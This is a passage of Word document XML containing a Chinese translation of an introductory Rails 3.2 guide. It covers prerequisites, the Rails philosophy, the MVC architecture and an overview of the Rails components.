            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Security</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B9261D4"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53" w:anchor="14" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Building a Multi-Model Form</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19BFD94F"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54" w:anchor="15" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>View Helpers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="700076A0"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55" w:anchor="16" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>What’s Next?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5CD3CA8A" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId56" w:anchor="17" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Configuration Gotchas配置陷阱</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="440DF80F"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这个指导手册适用与 Rails 3.2，有些代码在 Rails 早期版本可能无法正常运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F22ED0"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1 手册假设</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FAD9D2"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本指导设计给那些想大概的了解 Rails 应用创建的初学者。这里假设你对 Rails 没有任何预先的了解。要得到（本手册的）知识，你需要预先安装：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79833B95" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId57" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002D0E77">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:highlight w:val="green"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002D0E77">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.8.7</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者更高版本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A91AB5B"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注意 Ruby 1.8.7 p248 和 p249 有 marshaling bugs ，会与 Rails 3.0 发生冲突。Ruby 1.8.7 p248 和 p249在 发行版 1.8.7-2010.02 已经得到解决。Ruby 1.9 下 Ruby 1.9.1 不能使用，因为它在 Rails 3.0 上会出现 segfaults 错误，因此如果你希望使用 Rails 3 和 1.9.x ，更新版本到 1.9.2 就可以安全地使用 Rails。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01678F04" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId58" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RubyGems</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包管理系统 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE62E78" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="4"/>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如果你想了解更多关于 RubyGems 的知识，请阅读 </w:t>
      </w:r>
      <w:hyperlink r:id="rId59" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RubyGems User Guide</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="25919D45" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>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安装 </w:t>
      </w:r>
      <w:hyperlink r:id="rId60" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQLite3 Database</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E4B1FD4"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Rails 是一个基于 Ruby 程序语言的 web 程序框架。如果你没有预先的学习 Ruby，你会发现直接的入门 Rails 学习很有跨度。这里有一些免费 Ruby 的学习资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0310F7F6" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId61" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mr. Neighborly’s Humble Little Ruby Book</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D055A14" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId62" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Programming Ruby</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="115D9693" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId63" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Why’s (Poignant) Guide to Ruby</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E663FB2"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同样，你可以在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId64" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails github</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 仓库找到这个教程的示例代码，本教程在（rails/railties/guides/code/getting_started）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A675A4"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2 Rails 是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FBF695"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这个章节开始就 Rails 框架的背景和来源做一个详细的描述。你可以安全的跳过这个章节并且在以后再回过头来看它。第三节你会开始你的的 Rails 之旅上的第一个 Rails 应用程序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542FA272"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Rails是一个使用 Ruby 语言编写的的 web 框架应用程序。其设计目的是为了让每个着手开始编写 web 应用程序的开发人员更加容易的完成工作。它允许你写最少的代码完成超过其他任何语言和框架所完成的工作。经验丰富的 Rails 开发人员还告诉我们通过 Rails 使设计 web 应用程序更快乐。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4277D3F8"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Rails 是一个值得骄傲的软件。它使得我们以最好的方式去做事情，它也鼓励这种方式——并在某些情况下，鼓励替代的思想，如果你学习 “Rails 方式” 你将会适时的发现生产力的巨大增长。如果你固守在来自其他语言的旧的习惯去进行你的 Rails 开发，以以它地方学来的模式尝试 Rails，那么你将会得到很少的快乐的经历。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0BA1CC"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Rails 理念包含几个指导原则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4AB445" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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DRY – 不要自己重复——建议一次又一次编写同样的代码是一件坏事请</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF2BEDD" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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约定优于配置——意思是 Rails 假设对于你想做什么以及你想怎么做的事情，刻意的做很少的事情比编写无尽的配置文件更好</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A91119B"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2.1 MVC 架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5D41C0"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Model，View，Controller架构是 Rails 的核心，通常称之为 MVC。MVC 的优点如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B01F72" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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用户界面与业务逻辑的分离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB310D6" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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很容易使得代码保持 DRY # “Don’t Repeat Yourself”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4999B2F7" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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明确代码的不同之处使之跟容易维护</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287383AD" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.1.1 模型（ Models ）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728F446F"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模型代表了应用程序的信息（数据）和操纵这些数据的规则。在 Rails 中， models 主要用于管理数据表和相应的规则的互动。在大多数情况，在你数据库中的每个表都会和你的应用程序互动。你应用程序的逻辑业务将会集中放置在 models 中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D414630" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.1.2 视图（ Views ）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2EA6FB"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View代表了应用程序的用户界面。在 Rails 中，Views 通常是嵌入了执行演示数据任务的Ruby代码的HTML文件。Views完成了给web浏览器或者其他工具用于提出来自你的程序的请求提供数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C8DBA7" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.1.3 控制器（ Controllers ）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189F61CC"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Controllers 提供了 Models 和 Views 间的粘合。在 Rails 中，Controllers 响应来自 Web 浏览器请求的进程，向 Models 询问数据并将数据传递给 Views 呈现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35779791"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3 Rails 的组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47FE61F4"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Rails 关联着许多独立的组件。对这些组件在下面给出简要的解释。如果你是 Rails 的新人，当你阅读到这个部分时，不要忽视任何一个组件的描述，但也没有必要了解的过于深入。例如，我们会构造应用骨架，但你不需要了解有关构造应用骨架的深层知识。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0500A409" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Action Pack </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A1B14F" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="8"/>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Action Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1BD47A" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="8"/>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Action Dispatch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B32FAD" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="8"/>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Action View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D38D423" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Action Mailer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082F502F" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Active Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A23CC28" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Active Record</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A5BCD08" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Active Resource</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED59614" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Active Support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EB65DE" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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Railties</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAFBF00"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3.1 Action Pack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003F5C8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Action Pack 是一个单独的包它包含了 Action Controller, Action View and Action Dispatch（传输调度）。是 MVC 的 VC 部分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CDBF13" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.1 Action Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05280470"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Action Controller 是在 Rails 中管理控制的组件。 The Action Controller 框架进程收到 Rails 应用程序的请求，提取参数，以及调度他们到具有相应义务的动作。这些服务是由 Action Controller 提供，包含会话管理、模板渲染、重定向功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3EF7EF" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.2 Action View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BA878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Action View 管理你的 Rails 应用程序的视图。它可以创建 HTML 和 XML 作为默认输出。Action View 管理模板渲染，包含嵌套和局部模板，以及内置的 AJAX 支持。View templates 更多的更详细的内容在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId65" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Layouts and Rendering</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被提及。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33ED8A07" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
